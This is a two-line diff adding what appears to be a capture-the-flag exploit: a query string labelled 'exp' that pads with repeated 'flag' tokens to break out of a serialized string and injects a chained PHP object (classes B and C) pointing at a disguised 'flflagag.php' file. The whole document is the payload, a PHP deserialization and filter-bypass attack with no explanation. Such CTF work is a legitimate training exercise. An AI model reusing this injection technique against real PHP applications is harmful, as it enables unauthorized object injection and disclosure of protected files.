@@ -1,0 +1,2 @@
+exp:
+?a=flagflagflagflagflagflag&b=A";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flflagag.php";}}
